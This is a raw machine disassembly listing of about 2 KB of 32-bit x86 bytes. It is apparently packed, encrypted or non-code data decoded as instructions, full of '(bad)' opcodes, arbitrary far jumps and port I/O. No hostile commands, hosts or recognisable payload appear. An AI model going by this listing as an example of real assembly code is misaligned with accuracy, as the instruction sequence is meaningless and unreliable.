  40f4b5:	push   0x41427d63
  40f4ba:	arpl   WORD PTR [esi],bx
  40f4bc:	jecxz  0x40f532
  40f4be:	pop    ebx
  40f4bf:	mov    dh,0xb4
  40f4c1:	mov    eax,ds:0xfdea9b04
  40f4c6:	jle    0x40f45b
  40f4c8:	loope  0x40f4b4
  40f4ca:	bound  esp,QWORD PTR [esp+eax*4]
  40f4cd:	cmp    eax,0x45ddf963
	...
  40f4de:	add    BYTE PTR [eax],al
  40f4e0:	add    bh,ah
  40f4e2:	mov    esi,0x72dcb8c2
  40f4e7:	loope  0x40f4e7
  40f4e9:	rcr    DWORD PTR [ebx],1
  40f4eb:	sbb    eax,DWORD PTR [edi]
  40f4ed:	push   esi
  40f4ee:	inc    edi
  40f4ef:	loop   0x40f565
  40f4f1:	(bad)  
  40f4f2:	pop    edx
  40f4f3:	pop    eax
  40f4f4:	or     bl,cl
  40f4f6:	neg    DWORD PTR [esi-0x1]
  40f4f9:	mov    ah,0xa
  40f4fb:	inc    edx
  40f4fc:	leave  
  40f4fd:	mov    eax,ds:0xd85502e9
  40f502:	dec    ecx
  40f503:	xchg   bl,al
  40f505:	lahf   
  40f506:	fwait
  40f507:	cmp    DWORD PTR [edx+0x63],ebp
  40f50a:	enter  0xff2d,0x16
  40f50e:	(bad)  
  40f50f:	jmp    0x2688:0xe21b09f9
  40f516:	adc    cl,BYTE PTR [esi+0x45062334]
  40f51c:	add    al,bl
  40f51e:	loopne 0x40f566
  40f520:	sub    BYTE PTR [edx],ah
  40f522:	out    dx,al
  40f523:	cmp    BYTE PTR [esi],0x63
  40f526:	js     0x40f56f
  40f528:	push   0x43ad32
  40f52d:	mov    ah,0xf4
  40f52f:	and    DWORD PTR [eax+0x63],edx
  40f532:	in     al,dx
  40f533:	or     eax,0x38b3b7c0
  40f538:	call   0xff2358fe
  40f53d:	xchg   ebx,eax
  40f53e:	add    eax,0xea630451
  40f543:	sahf   
  40f544:	ins    BYTE PTR es:[edi],dx
	...
  40f551:	add    BYTE PTR [eax],al
  40f553:	add    BYTE PTR [eax],ah
  40f555:	inc    esi
  40f556:	sub    BYTE PTR [ebx+esi*4],al
  40f559:	ficom  DWORD PTR [ebx+0xc]
  40f55c:	sti    
  40f55d:	xor    DWORD PTR [ebx+0x68ee05e1],ecx
  40f563:	pop    edi
  40f564:	cld    
  40f565:	fcmovb st,st(1)
  40f567:	add    ebx,DWORD PTR [ebp+0x7603ee85]
  40f56d:	fild   QWORD PTR [esi]
  40f56f:	loopne 0x40f5a2
  40f571:	lds    ebx,FWORD PTR [edi-0x1f]
  40f574:	fstp   st(2)
  40f576:	xchg   ebp,eax
  40f577:	(bad)  
  40f578:	push   es
  40f579:	push   ds
  40f57a:	out    0x56,al
  40f57c:	or     bl,bl
  40f57e:	sti    
  40f57f:	ffreep st(5)
  40f581:	push   eax
  40f582:	icebp  
  40f583:	jmp    0x40f51d
  40f585:	pop    edi
  40f586:	jbe    0x40f569
  40f588:	adc    eax,0x60c6a03b
  40f58d:	add    eax,0x86b88cbc
  40f592:	and    al,0xe0
  40f594:	or     al,BYTE PTR ds:0x50942fc3
  40f59a:	loope  0x40f587
  40f59c:	push   cs
  40f59d:	pop    edi
  40f59e:	inc    esi
  40f59f:	loope  0x40f57c
  40f5a1:	inc    eax
  40f5a2:	cmp    eax,0xe96f636e
  40f5a7:	imul   eax,DWORD PTR [edx-0x4fc57bb],0x4
  40f5ae:	jmp    0xb12ed8b6
  40f5b3:	sbb    DWORD PTR [ebp-0x26],0xffffffe1
  40f5b7:	ret    
	...
  40f5c4:	add    BYTE PTR [eax],al
  40f5c6:	add    al,dl
  40f5c8:	cli    
  40f5c9:	mov    eax,0x5833deb
  40f5ce:	loope  0x40f564
  40f5d0:	ins    DWORD PTR es:[edi],dx
  40f5d1:	jmp    0xffdc41d9
  40f5d6:	cmp    al,0x19
  40f5d9:	inc    ecx
  40f5da:	jmp    0xf1b5d04f
  40f5df:	cmp    ch,ah
  40f5e1:	mov    al,ds:0xce203de
  40f5e6:	push   esp
  40f5e7:	add    bl,bl
  40f5e9:	(bad)  
  40f5ea:	push   esp
  40f5eb:	add    ebx,ebx
  40f5ed:	je     0x40f5e0
  40f5ef:	clc    
  40f5f0:	pop    ecx
  40f5f1:	jp     0x40f5b1
  40f5f3:	add    ecx,ebp
  40f5f5:	shr    ebp,0x60
  40f5f8:	xor    BYTE PTR [ebx-0x43a1843],cl
  40f5fe:	adc    ebx,DWORD PTR [edi+0x6f]
  40f601:	sub    eax,0xe80d359e
  40f606:	int    0x36
  40f608:	(bad)  
  40f60a:	pusha  
  40f60b:	and    eax,0x60e967d9
  40f610:	jmp    0xe941:0x44bc11bd
  40f617:	dec    eax
  40f618:	sub    al,0x41
  40f61a:	sub    BYTE PTR [edi-0x26],ah
  40f61d:	je     0x40f610
  40f61f:	mov    eax,0x835ea0ed
  40f624:	fidiv  DWORD PTR [ebp+edx*2-0x7d]
  40f628:	push   eax
  40f629:	or     BYTE PTR [ecx+0x0],al
	...
  40f638:	add    BYTE PTR [eax],al
  40f63a:	and    eax,0x9946ff5f
  40f63f:	ret    
  40f640:	add    ebp,ecx
  40f642:	xor    eax,0x9c6aeb8e
  40f647:	(bad)  [ecx-0x17]
  40f64a:	(bad)  
  40f64b:	sub    bh,bh
  40f64d:	pushf  
  40f64e:	pop    eax
  40f64f:	in     eax,dx
  40f650:	call   0x891939f5
  40f655:	lods   al,BYTE PTR ds:[esi]
  40f656:	xor    al,0x61
  40f658:	add    cl,ch
  40f65a:	push   ebx
  40f65b:	fwait
  40f65c:	add    BYTE PTR ds:0x4144,al
  40f661:	add    dl,dl
  40f663:	dec    ebx
  40f664:	inc    ecx
  40f665:	inc    ecx
  40f666:	dec    edx
  40f667:	out    0x73,al
  40f669:	or     BYTE PTR [edx+0x73],ah
  40f66c:	lahf   
  40f66d:	(bad)  
  40f66e:	cmp    eax,0x2d00006a
  40f673:	js     0x40f6db
  40f675:	aas    
  40f676:	dec    ebx
  40f677:	inc    edx
  40f678:	add    BYTE PTR [eax+0x43],ch
  40f67b:	inc    edx
  40f67c:	inc    ecx
  40f67d:	add    BYTE PTR ds:0x80e8083f,bl
  40f683:	mov    ds:0x3eadfffd,al
  40f688:	cld    
  40f689:	push   DWORD PTR [edi]
  40f68b:	or     eax,ebp
  40f68d:	repz inc ebx
  40f68f:	mov    eax,0xe08c9fd
  40f694:	add    BYTE PTR [ebp+0x41],dl
  40f697:	aad    0x81
  40f699:	(bad)  
  40f69a:	fimul  WORD PTR [ebx+edx*2+0x10]
	...
  40f6ad:	push   ecx
  40f6ae:	shr    DWORD PTR [eax+0x0],cl
  40f6b1:	dec    edi
  40f6b2:	dec    esi
  40f6b3:	cld    
  40f6b4:	push   eax
  40f6b5:	sub    eax,0xba6a083e
  40f6ba:	mov    bh,0x73
  40f6bc:	adc    BYTE PTR ds:0x4a851c13,bh
  40f6c2:	ds daa 
  40f6c4:	mov    edx,edi
  40f6c6:	mov    eax,0x6e7a6a8e
  40f6cb:	add    BYTE PTR [eax+0x1d],ch
  40f6ce:	add    al,0x0
  40f6d0:	add    BYTE PTR ds:0x2d6a0c3e,bh
  40f6d6:	mov    eax,0x4a00470
  40f6db:	push   0x0
  40f6dd:	push   edx
  40f6de:	stos   BYTE PTR es:[edi],al
  40f6df:	dec    ebx
  40f6e0:	add    BYTE PTR [edx+0x54],cl
  40f6e3:	(bad)  
  40f6e4:	jne    0x40f749
  40f6e6:	bnd jmp 0x40f748
  40f6e9:	popf   
  40f6ea:	out    dx,al
  40f6eb:	add    cl,cl
  40f6ed:	and    edx,edx
  40f6ef:	add    dl,BYTE PTR [ebp-0x18]
  40f6f2:	or     DWORD PTR [ebx+0x396337c3],eax
  40f6f8:	adc    al,0xd8
  40f6fa:	mov    ebx,0x28d60068
  40f6ff:	loopne 0x40f750
  40f701:	sbb    al,0x31
  40f703:	adc    bh,bh
  40f705:	mov    fs,esi
  40f707:	push   0xf8310c00
  40f70c:	(bad)  
  40f70d:	mov    cl,0xf6
  40f70f:	mov    BYTE PTR [edi+0x0],bh
	...
  40f71d:	add    BYTE PTR [eax],al
  40f71f:	add    BYTE PTR [esi-0x1],dh
  40f722:	mov    dl,BYTE PTR [edi+esi*8+0x3d]
  40f726:	imul   eax,DWORD PTR [eax],0xff6aee79
  40f72c:	pusha  
  40f72d:	out    dx,al
  40f72e:	add    bh,bh
  40f730:	push   esi
  40f731:	fisubr WORD PTR [eax-0x1]
  40f734:	aam    0xfb
  40f736:	pop    es
  40f737:	push   0x63
  40f739:	add    al,0x4
  40f73b:	call   0x450868
  40f740:	rcl    DWORD PTR [esi+0x58],cl
  40f743:	cld    
  40f744:	retf   
  40f745:	mov    ebx,0xa563004c
  40f74a:	ror    BYTE PTR [edi],0x63
  40f74d:	cdq    
  40f74e:	mov    ebx,ebp
  40f750:	pushf  
  40f751:	mov    al,0xa
  40f753:	dec    DWORD PTR [esi]
  40f755:	(bad)  
  40f756:	jmp    0xefe:0xde470b52
  40f75d:	shr    dl,cl
  40f75f:	xchg   edi,eax
  40f760:	cs out dx,al
  40f762:	add    dl,cl
  40f764:	sub    DWORD PTR [edx-0x3d],0x1
  40f768:	adc    esp,DWORD PTR [edi]
  40f76a:	pop    eax
  40f76b:	or     al,0x64
  40f76d:	add    al,0x9c
  40f76f:	sti    
  40f770:	inc    esp
  40f771:	push   esi
  40f772:	mov    eax,ds:0x9bd755de
  40f777:	test   DWORD PTR [ebp+0x51],0xfdcfdef9
  40f77e:	adc    BYTE PTR [ecx-0x45],ah
  40f781:	(bad)  
  40f782:	std    
  40f783:	retf   
	...
  40f790:	add    BYTE PTR [eax],al
  40f792:	add    BYTE PTR [edx],ah
  40f794:	bnd call 0xee2acfd2
  40f79a:	push   edi
  40f79b:	pop    ebx
  40f79c:	(bad)  
  40f79d:	pop    ebx
  40f79e:	cld    
  40f79f:	add    al,0xfc
  40f7a1:	pusha  
  40f7a2:	fst    QWORD PTR ds:0xfb105bd7
  40f7a8:	mov    BYTE PTR [esp+eax*1],bl
  40f7ab:	arpl   WORD PTR [ebp+0x19],ax
  40f7ae:	fnsave [edi+0x9]
  40f7b1:	mov    esi,0xf1ed5b57
  40f7b6:	pop    ebx
  40f7b7:	in     al,dx
  40f7b8:	(bad)  
  40f7b9:	lods   eax,DWORD PTR ds:[esi]
  40f7ba:	push   edi
  40f7bb:	dec    edi
  40f7bc:	(bad)  
  40f7bd:	sbb    esi,esp
  40f7bf:	fst    QWORD PTR [eax+0x1]
  40f7c2:	in     al,dx
  40f7c3:	xchg   DWORD PTR [ebp-0x6a],ebx
  40f7c6:	fstp   QWORD PTR [ebx+0x2e03f4c3]
  40f7cc:	mov    dl,BYTE PTR [ebx+eax*4-0x22864e60]
  40f7d3:	mov    ch,0xd6
  40f7d5:	sti    
  40f7d6:	sti    
  40f7d7:	fild   WORD PTR [eax-0x295a2018]
  40f7dd:	mov    eax,0x510d17dc
  40f7e2:	mov    esi,0xdd55d696
  40f7e7:	pop    ss
  40f7e8:	std    
  40f7e9:	pop    ebx
  40f7ea:	xchg   DWORD PTR [esi+ecx*8-0x29d322bb],eax
  40f7f1:	mov    bl,0xf
  40f7f3:	je     0x40f845
  40f7f5:	add    cl,ah
	...
  40f803:	add    BYTE PTR [eax],al
  40f805:	add    BYTE PTR [eax-0xe],bh
  40f808:	(bad)  
  40f809:	xchg   BYTE PTR cs:[eax+eax*1-0x6d],ch
  40f80e:	pusha  
  40f80f:	ins    DWORD PTR es:[edi],dx
  40f810:	(bad)  
  40f811:	jmp    0xd167:0x6c8d0560
  40f818:	dec    BYTE PTR [esi]
  40f81a:	(bad)  
  40f81b:	imul   edi,edi,0x6
  40f81e:	xchg   esp,eax
  40f81f:	cmc    
  40f820:	imul   ebp,ecx,0x5be805ca
  40f826:	xchg   ebx,eax
  40f827:	add    eax,0xe5dc2600
  40f82c:	repnz out 0x3f,al
  40f82f:	push   es
  40f830:	add    cl,ch
  40f832:	pusha  
  40f833:	mov    esi,0xd733dd84
  40f838:	(bad)  
  40f839:	jmp    0x40f89b
  40f83b:	add    eax,0xcde5ae00
  40f840:	repnz mov esi,0xe9fed617
  40f846:	pusha  
  40f847:	mov    esi,0xd713ad84
  40f84c:	(bad)  
  40f84d:	jmp    0x7240fdb2
  40f852:	(bad)  
  40f853:	std    
  40f854:	mov    bh,bl
  40f856:	cmp    al,BYTE PTR ds:0xd2b0648d
  40f85c:	inc    BYTE PTR [esi-0x727b7790]
  40f862:	xchg   ebx,eax
  40f863:	(bad)  
  40f864:	(bad)  
  40f865:	sbb    esp,ebx
  40f867:	and    bh,0x7a
	...
  40f876:	add    BYTE PTR [eax],al
  40f878:	add    BYTE PTR [edi+0x35664fd6],al
  40f87e:	cmc    
  40f87f:	(bad)  
  40f880:	aam    0x64
  40f882:	(bad)  
  40f883:	je     0x40f866
  40f885:	cli    
  40f886:	add    al,0xff
  40f888:	aam    0x88
  40f88a:	(bad)  
  40f88b:	push   ecx
  40f88c:	add    dh,cl
  40f88e:	test   BYTE PTR [ebx-0x246c618],bh
  40f894:	add    BYTE PTR [ebp+0x7a011a7d],al
  40f89a:	add    DWORD PTR [ebx-0x24a8943],eax
  40f8a0:	dec    DWORD PTR [edx+0x2]
  40f8a3:	test   BYTE PTR [edi],cl
  40f8a5:	cmp    ecx,DWORD PTR [ecx]
  40f8a7:	add    bh,al
  40f8a9:	mov    edi,0x65fff19c
  40f8ae:	or     BYTE PTR [eax],al
  40f8b0:	out    dx,eax
  40f8b1:	je     0x40f913
  40f8b3:	pop    eax
  40f8b4:	inc    ecx
  40f8b5:	sti    
  40f8b6:	or     BYTE PTR [ebp-0x24ac57b],cl
  40f8bc:	call   FWORD PTR [edx-0x1f]
  40f8bf:	adc    cl,BYTE PTR [edx+ecx*1+0x9]
  40f8c3:	test   eax,eax
  40f8c5:	scas   al,BYTE PTR es:[edi]
  40f8c6:	dec    ebx
  40f8c7:	mov    DWORD PTR [ebp-0x24332],0xbeef090b
  40f8d1:	xchg   edx,eax
  40f8d2:	arpl   WORD PTR [ecx+0x41],ax
  40f8d5:	cli    
  40f8d6:	jge    0x40f85b
  40f8d8:	add    BYTE PTR [esi+0x50fdb0],dh
	...
  40f8ea:	add    BYTE PTR [eax],al
  40f8ec:	repnz mov dh,0x49
  40f8ef:	add    dl,cl
  40f8f1:	test   DWORD PTR [esi-0x7c38668c],edi
  40f8f7:	aam    0xe9
  40f8f9:	mov    al,0xfd
  40f8fb:	add    cl,dl
  40f8fd:	fistp  QWORD PTR [eax+ebp*2+0x414a48]
  40f904:	inc    edi
  40f905:	xchg   dh,bh
  40f907:	sti    
  40f908:	xor    eax,0x5ce84eb0
  40f90d:	inc    esp
  40f90e:	add    BYTE PTR [eax],al
  40f910:	dec    eax
  40f912:	or     eax,0x37f6385
  40f917:	add    BYTE PTR [ebx-0x3a],ah
  40f91a:	jo     0x40f95c
  40f91c:	and    bl,dh
  40f91e:	xchg   DWORD PTR [ebx+eiz*2+0x13fedb1a],eax
  40f925:	inc    esi
  40f926:	mov    bl,0x4b
  40f928:	arpl   si,bx
  40f92a:	or     eax,0x856dd7c0
  40f92f:	cmp    al,0x42
  40f931:	popf   
  40f932:	inc    ebx
  40f933:	add    BYTE PTR [ebx-0x15],ah
  40f936:	jle    0x40f8b8
  40f938:	arpl   si,bx
  40f93a:	add    bh,bh
  40f93c:	div    ch
  40f93e:	(bad)  
  40f93f:	(bad)  
  40f940:	xor    al,0x63
  40f942:	sbb    edi,0xfed9db30
  40f948:	out    dx,al
  40f949:	rcl    ebp,1
  40f94b:	(bad)  
  40f94c:	sbb    al,0x5b
  40f94e:	and    bl,0x0
	...
  40f95d:	add    BYTE PTR [eax],al
  40f95f:	adc    BYTE PTR [ebx-0x6a197327],dh
  40f965:	aad    0xfe
  40f967:	add    al,0xe
  40f969:	outs   dx,BYTE PTR ds:[esi]
  40f96a:	add    DWORD PTR [ecx-0x76ff9322],ecx
  40f970:	fisubr WORD PTR [eax+eax*1-0x22]
  40f974:	pusha  
  40f975:	jecxz  0x40f969
  40f977:	in     al,0xa2
  40f979:	xor    bh,bh
  40f97b:	jbe    0x40f9fa
  40f97d:	inc    ebx
  40f97e:	inc    ecx
  40f97f:	arpl   di,dx
  40f981:	ret    0x2473
  40f984:	jnp    0x40f9d5
  40f986:	adc    al,0xc4
  40f988:	cmp    BYTE PTR [ebx-0x2675430e],bh
  40f98e:	mov    ah,0x97
  40f990:	dec    esi
  40f991:	(bad)  
  40f993:	lods   al,BYTE PTR ds:[esi]
  40f994:	shl    dl,1
  40f996:	(bad)  
  40f997:	out    dx,al
  40f998:	jns    0x40f96f
  40f99a:	(bad)  
  40f99b:	pushf  
  40f99c:	add    al,0x51
  40f99e:	ficom  WORD PTR [edi-0x2825a22d]
  40f9a4:	mov    al,0x59
  40f9a6:	fiadd  DWORD PTR [ebp+0x634d2edc]
  40f9ac:	add    eax,0x5975f852
  40f9b1:	aad    0xda
  40f9b3:	mov    bh,0xdc
  40f9b5:	cmp    edx,ebx
  40f9b7:	shl    DWORD PTR gs:[ebx-0x19],cl
  40f9bb:	push   ecx
  40f9bc:	shl    DWORD PTR ds:0x1df5cfda,cl
  40f9c2:	nop
	...
  40f9cf:	add    BYTE PTR [eax],al
  40f9d1:	add    BYTE PTR [eax],dh
  40f9d3:	xlat   BYTE PTR ds:[ebx]
  40f9d4:	adc    eax,0xbb53cda
  40f9d9:	fidivr DWORD PTR ds:0x31e73bd3
  40f9df:	sar    ebp,cl
  40f9e1:	jmp    0xc81a:0x3e93f10
  40f9e8:	aam    0x3
  40f9ea:	mov    dh,0x7e
  40f9ec:	aam    0x85
  40f9ee:	and    BYTE PTR [esi-0x64872cb],cl
  40f9f4:	popa   
  40f9f5:	not    bh
  40f9f7:	dec    eax
  40f9f8:	xchg   ecx,eax
  40f9f9:	xor    al,0x89
  40f9fb:	add    eax,0xd2674fc6
  40fa00:	xor    ecx,DWORD PTR [ecx+edi*2]
  40fa03:	add    eax,0xd24f4fb6
  40fa08:	sbb    dh,BYTE PTR [eax]
  40fa0a:	out    0xc5,al
  40fa0c:	sbb    esi,DWORD PTR [eax]
  40fa0e:	pushf  
  40fa0f:	dec    eax
  40fa10:	pop    ebp
  40fa11:	add    al,0x63
  40fa13:	add    eax,0x8d2f8ce9
  40fa18:	popa   
  40fa19:	imul   bh
  40fa1b:	dec    eax
  40fa1c:	inc    ebp
  40fa1d:	xor    al,0xe6
  40fa1f:	dec    eax
  40fa20:	test   eax,0xfff53934
  40fa25:	jne    0x40fa3b
  40fa27:	(bad)  
  40fa28:	(bad)  
  40fa29:	sbb    ebp,DWORD PTR [ebx-0x7a]
  40fa2c:	jl     0x40f9d3
  40fa2e:	pop    edi
  40fa2f:	pop    ecx
  40fa30:	daa    
  40fa31:	ins    BYTE PTR es:[edi],dx
  40fa32:	xor    al,0xc5
  40fa34:	(bad)  
  40fa35:	fadd   QWORD PTR [eax]
	...
  40fa43:	add    BYTE PTR [eax],al
  40fa45:	je     0x40fa1a
  40fa47:	je     0x40fa42
  40fa49:	fwait
  40fa4a:	sbb    edi,edi
  40fa4c:	mov    esp,0xf174d25c
  40fa51:	js     0x40fa09
  40fa53:	cld    
  40fa54:	ss mov dl,bl
  40fa57:	ss inc ecx
  40fa59:	les    edi,FWORD PTR [esi]
  40fa5b:	add    cl,ch
  40fa5d:	(bad)  
  40fa5f:	add    ebx,DWORD PTR [esi]
  40fa61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa62:	xchg   ecx,eax
  40fa63:	je     0x40fa9c
  40fa65:	ss fwait
  40fa67:	mov    dh,BYTE PTR [eax+ebx*8-0x5bf9ee82]
  40fa6e:	(bad)  
  40fa6f:	(bad)  
  40fa70:	fwait
  40fa71:	pop    eax
  40fa72:	xor    cl,cl
  40fa74:	sub    ebp,DWORD PTR [edi]
  40fa76:	rcl    BYTE PTR [ebx+0x62],cl
  40fa79:	or     eax,DWORD PTR [ebp-0x2cc51e3d]
  40fa7f:	(bad)  
  40fa80:	fidivr WORD PTR ss:[eax]
  40fa83:	adc    BYTE PTR [edx+0xe],ah
  40fa86:	add    DWORD PTR [ecx+edx*8+0x19fed31a],0x34ff0585
  40fa91:	pop    edi
  40fa92:	pop    edi
  40fa93:	add    BYTE PTR [esi+0x1bfef595],dh
  40fa99:	jnp    0x40fa23
  40fa9b:	mov    edi,0x84ca421c
  40faa0:	popf   
  40faa1:	stos   BYTE PTR es:[edi],al
  40faa2:	sar    dh,cl
  40faa4:	jmp    0x62410009
	...
  40fab5:	add    BYTE PTR [eax],al
  40fab7:	add    BYTE PTR [ebp-0x26],cl
  40faba:	std    
  40fabb:	add    ch,bl
  40fabd:	lods   al,BYTE PTR ds:[esi]
  40fabe:	mov    DWORD PTR [edx],edx
  40fac0:	aas    
  40fac1:	push   ebx
  40fac2:	sti    
  40fac3:	(bad)  
  40fac4:	sub    eax,0x78d4ead
  40fac9:	push   es
  40faca:	(bad)  
  40facb:	(bad)  
  40facc:	std    
  40facd:	adc    eax,0x832d106a
  40fad2:	idiv   dh
  40fad4:	sub    eax,0x9e52fdad
  40fad9:	mov    BYTE PTR [ebx-0x252e304],bh
  40fadf:	add    BYTE PTR [esi+0x7abd8d27],dh
  40fae5:	lods   al,BYTE PTR ds:[esi]
  40fae6:	std    
  40fae7:	dec    DWORD PTR [ebp-0x800efc1]
  40faed:	or     BYTE PTR [edi-0x1],dl
  40faf0:	idiv   esp
  40faf2:	out    0x13,eax
  40faf4:	ins    DWORD PTR es:[edi],dx
  40faf5:	lods   eax,DWORD PTR ds:[esi]
  40faf6:	std    
  40faf7:	add    DWORD PTR [ebp+0x5e8dfdd4],0xffffffae
  40fafe:	std    
  40faff:	push   DWORD PTR [edi-0x3e55161a]
  40fb05:	pop    edi
  40fb06:	idiv   esi
  40fb08:	or     eax,0xfd1289b9
  40fb0d:	jbe    0x40fb05
  40fb0f:	(bad)  
  40fb10:	sub    eax,0x252fdb9
  40fb15:	sbb    cl,cl
  40fb17:	ret    0x51e
  40fb1a:	push   ebp
  40fb1b:	mov    eax,DWORD PTR [eax]
	...
  40fb29:	add    BYTE PTR [eax],al
  40fb2b:	push   cs
  40fb2c:	mov    eax,edx
  40fb2e:	clc    
  40fb2f:	lods   al,BYTE PTR ds:[esi]
  40fb30:	mov    eax,0x168157fd
  40fb35:	or     al,0x8b
  40fb37:	mov    eax,0xfcf8837d
  40fb3c:	mov    eax,0x97050fd
  40fb41:	push   0x0
  40fb43:	arpl   WORD PTR [edi+0x50],si
  40fb46:	or     al,0xbc
  40fb48:	or     al,0x1c
  40fb4a:	test   DWORD PTR [ebx+0x26c735d1],esp
  40fb50:	push   edx
  40fb51:	add    al,0x0
  40fb53:	arpl   si,bx
  40fb55:	jb     0x40fae1
  40fb57:	not    BYTE PTR [esi-0x2a]
  40fb5a:	(bad)  
  40fb5b:	xchg   esp,eax
  40fb5c:	push   ebx
  40fb5d:	repnz mov WORD PTR [esi],fs
  40fb60:	xor    dh,BYTE PTR [ecx*4-0x129c522]
  40fb67:	jl     0x40faf7
  40fb69:	push   0xdc517410
  40fb6e:	std    
  40fb6f:	ins    BYTE PTR es:[edi],dx
  40fb70:	(bad)  
  40fb72:	push   ecx
  40fb73:	push   edi
  40fb74:	cmp    DWORD PTR cs:[edi+ebx*2-0x22],0x72
  40fb7a:	jae    0x40faff
  40fb7c:	pop    ecx
  40fb7d:	cdq    
  40fb7e:	sti    
  40fb7f:	dec    ebp
  40fb80:	out    dx,eax
  40fb81:	(bad)  
  40fb82:	pop    DWORD PTR [ecx+esi*2+0x6]
  40fb86:	push   DWORD PTR [esi+0x6be82de6]
  40fb8c:	pop    es
  40fb8d:	xlat   BYTE PTR ds:[ebx]
  40fb8e:	inc    BYTE PTR [eax]
	...
  40fb9c:	add    BYTE PTR [eax],al
  40fb9e:	loopne 0x40fbc6
  40fba0:	hlt    
  40fba1:	(bad)  
  40fba2:	and    al,0xa9
  40fba4:	(bad)  
  40fba5:	(bad)  
  40fba6:	xchg   esi,eax
  40fba7:	add    eax,0x52d1ea74
  40fbac:	jo     0x40fba5
  40fbae:	or     eax,0x718ad5af
  40fbb3:	mov    bh,0x8f
  40fbb5:	idiv   ebp
  40fbb7:	mov    esi,0xd691fed5
  40fbbc:	xor    eax,0x2d621c9
  40fbc1:	push   ebp
  40fbc2:	fmul   st,st(1)
  40fbc4:	add    ebx,0x74d6f813
  40fbca:	addr16 add eax,0x51bcc91
  40fbd0:	jmp    0xec9a9edf
  40fbd5:	xor    eax,0x3dcc2aa
  40fbda:	xchg   edx,eax
  40fbdb:	in     al,0x69
  40fbdd:	ret    
  40fbde:	bound  edi,QWORD PTR [eax+ebx*4-0x78]
  40fbe2:	pop    ds
  40fbe3:	loope  0x40fbfd
  40fbe5:	xor    bl,BYTE PTR [ecx+ebx*2+0x7f00ebdd]
  40fbec:	gs (bad) 
  40fbee:	cmp    DWORD PTR [esi-0x2450b791],edi
  40fbf4:	loop   0x40fc03
  40fbf6:	ins    BYTE PTR es:[edi],dx
  40fbf7:	xchg   edi,eax
  40fbf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbf9:	sub    al,0x87
  40fbfb:	add    eax,0x8423afac
  40fc00:	aas    
  40fc01:	out    dx,eax
	...
  40fc0e:	add    BYTE PTR [eax],al
  40fc10:	add    dl,dh
  40fc12:	aad    0x1
  40fc14:	into   
  40fc15:	jmp    0x40fc6f
  40fc17:	sbb    edx,ebp
  40fc19:	jl     0x40fc32
  40fc1b:	test   BYTE PTR [ebp+0x330d1fa0],0xbb
  40fc22:	lock stos BYTE PTR es:[edi],al
  40fc24:	inc    esp
  40fc25:	arpl   WORD PTR [eax-0x225b445d],ax
  40fc2b:	adc    al,0x4c
  40fc2d:	arpl   WORD PTR ds:0x8058bf6a,ax
  40fc33:	stos   DWORD PTR es:[edi],eax
  40fc34:	mov    ebx,0xb373ceac
  40fc39:	cld    
  40fc3a:	jge    0x40fc9d
  40fc3c:	aad    0xd
  40fc3e:	jge    0x40fc63
  40fc40:	mov    ah,0x9e
  40fc42:	adc    dh,0xf0
  40fc45:	jb     0x40fbf9
  40fc47:	addr16 pop edi
  40fc49:	bswap  edi
  40fc4b:	call   0x340f5f53
  40fc50:	mov    al,0x7c
  40fc52:	lock jmp FWORD PTR [edx]
  40fc55:	and    BYTE PTR ds:0x3f17248d,al
  40fc5b:	call   0x4614c5
  40fc60:	push   0xffffffa3
  40fc62:	cli    
  40fc63:	mov    WORD PTR [edi+edi*8],gs
  40fc66:	notrack call DWORD PTR [edi+ebp*8]
  40fc6a:	out    0x57,al
  40fc6c:	add    dl,BYTE PTR [esi-0x10db7731]
  40fc72:	add    DWORD PTR [ebp+eiz*4+0x0],0x0
	...
  40fc82:	add    BYTE PTR [eax],al
  40fc84:	push   edi
  40fc85:	into   
  40fc86:	je     0x40fc21
  40fc88:	pop    es
  40fc89:	and    eax,DWORD PTR [edx-0x58]
  40fc8c:	pusha  
  40fc8d:	into   
  40fc8e:	xor    al,0x6
  40fc90:	cmp    BYTE PTR [eax+eax*1+0x41],al
  40fc94:	add    cl,BYTE PTR [ebx-0x1]
  40fc97:	dec    esi
  40fc98:	push   0xffffffc5
  40fc9a:	push   cs
  40fc9b:	ins    DWORD PTR es:[edi],dx
  40fc9c:	dec    ch
  40fc9e:	(bad)  
  40fc9f:	jmp    0x6b09467d
  40fca4:	mov    ah,0xc1
  40fca6:	(bad)  
  40fca7:	fst    st(4)
  40fca9:	test   bh,bh
  40fcab:	call   0xedb5cb10
  40fcb0:	cmp    BYTE PTR [edx],al
  40fcb2:	dec    ecx
  40fcb3:	jmp    0x6b20b118
  40fcb8:	pop    ds
  40fcb9:	add    al,0x89
  40fcbb:	lods   al,BYTE PTR ds:[esi]
  40fcbc:	ror    dh,1
  40fcbe:	je     0x40fcad
  40fcc0:	fisttp WORD PTR [eax-0x4c]
  40fcc3:	imul   BYTE PTR [ebp+0x20a48ec1]
  40fcc9:	iret   
  40fcca:	je     0x40fc7d
  40fccc:	out    0x48,eax
  40fcce:	les    esp,FWORD PTR [esi-0x17006ebb]
  40fcd4:	pusha  
  40fcd5:	add    eax,0x1c680c83
  40fcda:	inc    ecx
  40fcdb:	add    dl,bh
  40fcdd:	add    DWORD PTR [eax+edx*2+0x77],esi
  40fce1:	(bad)  
  40fce3:	push   eax
  40fce4:	and    BYTE PTR [edx],al
  40fce6:	push   0x0
	...
  40fcf4:	add    BYTE PTR [eax],al
  40fcf6:	add    BYTE PTR [eax],ah
  40fcf8:	or     DWORD PTR [ebp+0x6a122a45],ecx
  40fcfe:	add    BYTE PTR [edi],dh
  40fd00:	xadd   BYTE PTR [eax-0x2b],dl
  40fd04:	fiadd  WORD PTR [edi]
  40fd06:	sub    DWORD PTR [ebx-0x513ff4f7],ecx
  40fd0c:	repz cmp BYTE PTR [ebp+0x66],0x2
  40fd11:	je     0x40fd3f
  40fd13:	or     DWORD PTR [edi],esi
  40fd15:	adc    BYTE PTR [eax],al
  40fd17:	mov    ?,ecx
  40fd19:	mov    dl,BYTE PTR [ebp-0x76]
  40fd1c:	das    
  40fd1d:	mov    DWORD PTR [edx],0x75ff0965
  40fd23:	cmp    BYTE PTR [eax+0x3f25b873],0xbc
  40fd2a:	jmp    FWORD PTR [edi+0x7a036805]
  40fd30:	call   0xaeefe5f1
  40fd35:	std    
  40fd36:	inc    DWORD PTR [ebp-0x6f1743c5]
  40fd3c:	or     DWORD PTR [eax],eax
  40fd3e:	add    BYTE PTR [ebp+0x3b],ah
  40fd41:	enter  0xa6e8,0x3a
  40fd45:	(bad)  
  40fd46:	jmp    DWORD PTR [ebp+0x3b]
